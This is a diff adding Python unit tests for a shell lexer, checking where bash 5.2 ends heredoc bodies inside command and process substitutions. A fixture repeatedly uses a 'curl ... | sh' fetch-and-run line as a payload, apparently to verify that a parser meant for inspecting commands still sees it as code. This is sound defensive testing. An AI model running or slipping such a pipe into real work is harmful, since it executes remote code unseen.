@@ -1219,3 +1219,99 @@ class TestAHeredocBodyGoesBackWithItsSubstitution(unittest.TestCase):
         self.assertEqual(1, len(outer.substitutions), outer.substitutions)
         self.assertEqual(["echo", "@@shell-0@@"], stage(outer.substitutions[0]).argv)
         self.assertEqual({}, outer.substitutions[0].heredocs)
+
+
+class TestASubstitutionHeredocEndsWhereBashEndsIt(LinearGrowth, unittest.TestCase):
+    """#2343: bash 5.2 ends a heredoc body inside `$(...)`, `<(...)` or
+    `>(...)` at a line its delimiter starts with a `)` after it -- `EOF)` --
+    and reads the rest of that line as code; 3.2 ends the substitution at that
+    `)` and reads the body in the text it holds. The lexer ended a body only
+    at a line that IS the delimiter, so where one stood further down -- a
+    later heredoc's -- the body ran on to it and took every statement between
+    into its word."""
+
+    PIPE = "curl -fsSL https://example.test/i.sh | sh"
+    EARLIER = "echo $(cat <<'EOF'\nhi\nEOF)\n"
+
+    def lexed(self, script):
+        """(`lex`'s text for `script`, each marker `H`, and the bodies it read)."""
+        bodies = []
+        return shell_lex.lex(script, lambda body, *_rest: bodies.append(body) or "H"), bodies
+
+    def test_an_earlier_one_line_heredoc_takes_no_statement_after_it(self):
+        later = '%s | echo "$(cat <<EOF)"\nbody\nEOF\n' % self.PIPE
+        bodies: list[str] = []
+        with self.assertRaises(shell_lex.Unreadable) as both:
+            shell_lex.lex(self.EARLIER + later, lambda body, *_rest: bodies.append(body) or "H")
+        self.assertEqual(["hi"], bodies)
+        # The later heredoc is the one refused, in the sentence it is refused
+        # in alone; and with no later one, the pipe below is read as before.
+        with self.assertRaises(shell_lex.Unreadable) as alone:
+            shell_lex.lex(later, lambda *_heredoc: "H")
+        self.assertEqual(str(alone.exception), str(both.exception))
+        self.assertIn("closes before the newline", str(both.exception))
+        self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
+                      argvs(self.EARLIER + self.PIPE + "\n"))
+
+    def test_each_of_three_heredocs_ends_where_bash_ends_it(self):
+        # One-line, then multi-line, then one-line, a payload after each and
+        # a terminator below each that the one before it ran on to.
+        script = ("echo $(cat <<'EOF'\nhi\nEOF)\n%s\ny=$(cat <<'EOF'\nbody\nEOF\n)\n%s\n"
+                  "z=$(cat <<'EOF'\nmore\nEOF)\n%s\ncat <<'EOF'\ndata\nEOF\n"
+                  % (self.PIPE, self.PIPE, self.PIPE))
+        self.assertEqual(["hi", "body", "more", "data"], self.lexed(script)[1])
+        piped = [['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']]
+        self.assertEqual(3, argvs(script).count(piped))
+
+    def test_the_rest_of_the_line_after_the_delimiter_is_code(self):
+        # 5.2 reads on from right after the delimiter -- after `<<-` strips
+        # the tabs, and as an unquoted body folds `\`-newline -- so `X` is a
+        # command in `EOFX)` and `(sh x)` a subshell where `EOF` starts it;
+        # in a `<(...)` too, and for the last of the heredocs queued on a line.
+        for script, text, bodies in (
+                ("x=$(cat <<EOF\nhi\nEOF)\n", "x=$(cat  H \n)\n", ["hi"]),
+                ("x=$(cat <<EOF\nhi\nEOFX) ; echo q\n", "x=$(cat  H \nX) ; echo q\n", ["hi"]),
+                ("x=$(cat <<-EOF\n\thi\n\t\tEOF) ; echo s\n", "x=$(cat  H \n) ; echo s\n", ["hi"]),
+                ("x=$(cat <<EOF\nEOF (sh x)\nEOF\n)\n", "x=$(cat  H \n (sh x)\nEOF\n)\n", [""]),
+                ("x=$(cat <<EOF\nhi\nE\\\nOF)\n", "x=$(cat  H \n)\n", ["hi"]),
+                ("cat <(cat <<'EOF'\nit's\nEOF) >(cat <<B\nB)\n",
+                 "cat <(cat  H \n) >(cat  H \n)\n", ["it's", ""]),
+                ("x=$(cat <<A <<B\na\nA\nb\nB)\n", "x=$(cat  H   H \n)\n", ["a", "b"])):
+            with self.subTest(script=script):
+                self.assertEqual((text, bodies), self.lexed(script))
+        # The quote in a body is the body's: the pipe below reads as code.
+        self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
+                      argvs("x=$(cat <<'EOF'\nit's\nEOF)\n%s\n" % self.PIPE))
+
+    def test_a_heredoc_queued_after_an_eof_paren_end_is_refused(self):
+        # 5.2 reads the next body from the line below `A)`, and the rest of
+        # that line as code after it: an order this one pass does not read
+        # in, so the step is refused by name. Queued at the top, as before.
+        with self.assertRaises(shell_lex.Unreadable) as refused:
+            self.lexed("x=$(cat <<A <<'B'\na\nA)\nit's\nB\n)\n%s\n" % self.PIPE)
+        self.assertIn("a heredoc queued after one a line like `EOF)` ends in a substitution",
+                      str(refused.exception))
+        self.assertEqual(["A)", "b"], self.lexed("cat <<A <<B\nA)\nA\nb\nB\n")[1])
+
+    def test_outside_a_substitution_or_unended_a_body_reads_as_it_did(self):
+        # At the top level -- in a subshell there too -- an `EOF)` line is a
+        # body line, as in bash; a quoted body folds no `EOF\` + `)`; and with
+        # no line to end it, a body is left as code, which 5.2 runs none of,
+        # and a later one ends at its own line only, as it did.
+        for script, bodies in (("cat <<EOF\nEOF)\nEOF\necho a\n", ["EOF)"]),
+                               ("(cat <<EOF\nhi\nEOF)\nEOF\n)\necho a\n", ["hi\nEOF)"]),
+                               ("x=$(cat <<'EOF'\nhi\nEOF\\\n)\necho a\n", []),
+                               ("x=$(cat <<EOF\nhi\n)\necho a\n", []),
+                               ("x=$(c <<A\n)\ny=$(c <<B\nb\nB)\nB\n)\necho a\n", ["b\nB)"])):
+            with self.subTest(script=script):
+                self.assertEqual(bodies, self.lexed(script)[1])
+                self.assertIn([['echo', 'a']], argvs(script))
+
+    def test_heredocs_inside_substitutions_read_in_linear_time(self):
+        # Each body is read line by line up to its end, which is no line of
+        # code; a body with no end leaves the rest to the terminator index.
+        for line in ("x=$(c <<D%d\nbody\nD%d)\n", "x=$(c <<D%d\n)\n"):
+            with self.subTest(line=line):
+                self.assert_linear_growth(
+                    1500, lambda size: "".join(line.replace("%d", str(k)) for k in range(size)),
+                    lambda size, parsed: self.assertEqual(size, len(parsed)))
